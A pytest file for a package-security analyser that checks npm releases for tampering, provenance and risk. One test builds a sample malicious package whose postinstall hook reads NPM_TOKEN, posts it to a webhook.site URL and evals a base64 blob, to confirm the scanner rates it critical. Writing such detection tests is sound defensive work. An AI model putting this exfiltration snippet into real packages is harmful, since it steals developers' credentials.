import gzip
import hashlib
import io
import json
import tarfile
from pathlib import Path
from typing import Any

import httpx
import pytest

from app.adapters.base import (
    ArtifactInfo,
    DownloadedArtifact,
    PackageAdapter,
    PackageMetadata,
)
from app.analysis.models import AnalysisScope, Severity
from app.analysis.service import ReleaseAnalysis, analyze_release
from app.provenance.models import ProvenanceStatus
from app.provenance.npm import NpmProvenanceChecker, VerificationUnavailableError
from app.scoring.risk import RiskLevel
from app.source.models import MatchStatus, SourceArchive, SourceMatch, UncertainReason
from tests.test_comparison import make_metadata, manifest, matched
from tests.test_provenance import FakeVerifier

pytestmark = pytest.mark.anyio


def tarball(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        for name, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(f"root/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return gzip.compress(buffer.getvalue())


class FakeAdapter(PackageAdapter):
    def __init__(self, metadata: PackageMetadata, files: dict[str, str]) -> None:
        self.metadata = metadata.model_copy(
            update={
                "artifacts": (
                    ArtifactInfo.model_construct(
                        filename="package.tgz", url="https://x", hashes=(), size_bytes=None
                    ),
                )
            }
        )
        self.data = tarball(files)

    async def fetch_metadata(self, name: str, version: str) -> PackageMetadata:
        return self.metadata

    async def download_artifact(
        self, artifact: ArtifactInfo, destination: Path
    ) -> DownloadedArtifact:
        destination.mkdir(parents=True, exist_ok=True)
        path = destination / "package.tgz"
        path.write_bytes(self.data)
        return DownloadedArtifact.model_construct(
            path=path,
            size_bytes=len(self.data),
            sha256=hashlib.sha256(self.data).hexdigest(),
            verified_algorithms=(),
        )


class FakeResolver:
    def __init__(self, match: SourceMatch, files: dict[str, str] | None = None) -> None:
        self.match = match
        self.files = files
        self.downloads = 0

    async def resolve(self, metadata: PackageMetadata) -> SourceMatch:
        return self.match

    async def download_source(self, match: SourceMatch, destination: Path) -> SourceArchive:
        self.downloads += 1
        destination.mkdir(parents=True, exist_ok=True)
        path = destination / "source.tgz"
        path.write_bytes(tarball(self.files or {}))
        return SourceArchive.model_construct(path=path)


async def run(
    tmp_path: Path,
    files: dict[str, str],
    resolver: FakeResolver,
    verifier: FakeVerifier | None = None,
    handler: Any = None,
    metadata: PackageMetadata | None = None,
) -> ReleaseAnalysis:
    def default(_: httpx.Request) -> httpx.Response:
        return httpx.Response(404)

    transport = httpx.MockTransport(handler or default)
    async with httpx.AsyncClient(transport=transport) as client:
        checker = NpmProvenanceChecker(client, verifier=verifier or FakeVerifier())
        return await analyze_release(
            FakeAdapter(metadata or make_metadata(), files),
            resolver,  # type: ignore[arg-type]
            checker,
            "demo",
            "1.0.0",
            tmp_path / "work",
        )


BASE = {"package.json": manifest(name="demo", version="1.0.0")}
UNCERTAIN = SourceMatch(
    status=MatchStatus.UNCERTAIN, reason=UncertainReason.NO_MATCHING_TAG, explanation="no tag"
)


async def test_clean_release_without_provenance_is_low(tmp_path: Path) -> None:
    result = await run(tmp_path, BASE, FakeResolver(matched(), BASE))
    assert result.comparison is not None
    assert result.provenance.status is ProvenanceStatus.UNAVAILABLE
    assert result.risk.score == 0
    assert result.risk.level is RiskLevel.LOW


async def test_injected_payload_is_flagged_end_to_end(tmp_path: Path) -> None:
    command = "node evil.js"
    package = {
        "package.json": manifest(name="demo", version="1.0.0", scripts={"postinstall": command}),
        "evil.js": (
            "const t = process.env.NPM_TOKEN;\n"
            "fetch('https://webhook.site/abc', { method: 'POST', body: t });\n"
            "eval(Buffer.from(blob, 'base64').toString());\n"
        ),
    }
    result = await run(
        tmp_path,
        package,
        FakeResolver(matched(), BASE),
        metadata=make_metadata(scripts={"postinstall": command}),
    )
    ids = {finding.rule_id for finding in result.security.findings}
    assert {"EXEC-003", "NET-002", "CORR-001", "CORR-005", "LIFE-001"} <= ids
    assert result.risk.level is RiskLevel.CRITICAL
    assert result.security.findings[0].severity is Severity.CRITICAL


async def test_uncertain_source_still_scans_package_and_is_not_compared(tmp_path: Path) -> None:
    resolver = FakeResolver(UNCERTAIN)
    result = await run(tmp_path, {**BASE, "a.js": "eval(atob(x))"}, resolver)
    assert resolver.downloads == 0
    assert result.comparison is None
    assert result.security.scope is AnalysisScope.WHOLE_PACKAGE
    assert "EXEC-003" in {finding.rule_id for finding in result.security.findings}
    assert result.risk.limitations


async def test_uncertain_source_with_harmless_code_is_low(tmp_path: Path) -> None:
    result = await run(tmp_path, {**BASE, "a.js": "export const a = 1"}, FakeResolver(UNCERTAIN))
    assert result.risk.level is RiskLevel.LOW


async def test_provenance_hash_is_checked_against_the_downloaded_file(tmp_path: Path) -> None:
    document = {"attestations": [{"predicateType": "https://slsa.dev/provenance/v1", "bundle": {}}]}
    result = await run(
        tmp_path,
        BASE,
        FakeResolver(matched(), BASE),
        FakeVerifier(),
        handler=lambda _: httpx.Response(200, json=document),
    )
    # FakeVerifier signs a digest of other bytes, so the real download must fail the check.
    assert result.provenance.status is ProvenanceStatus.INVALID
    assert result.risk.level is RiskLevel.HIGH


async def test_provenance_failing_to_run_does_not_stop_analysis(tmp_path: Path) -> None:
    document = {"attestations": [{"predicateType": "https://slsa.dev/provenance/v1", "bundle": {}}]}
    result = await run(
        tmp_path,
        BASE,
        FakeResolver(matched(), BASE),
        FakeVerifier(error=VerificationUnavailableError("offline")),
        handler=lambda _: httpx.Response(200, json=document),
    )
    assert result.provenance.status is ProvenanceStatus.NOT_VERIFIED
    assert result.risk.score == 0


async def test_result_serializes_to_json(tmp_path: Path) -> None:
    result = await run(tmp_path, {**BASE, "a.js": "fetch(u)"}, FakeResolver(matched(), BASE))
    assert json.loads(result.model_dump_json())["risk"]["statement"]
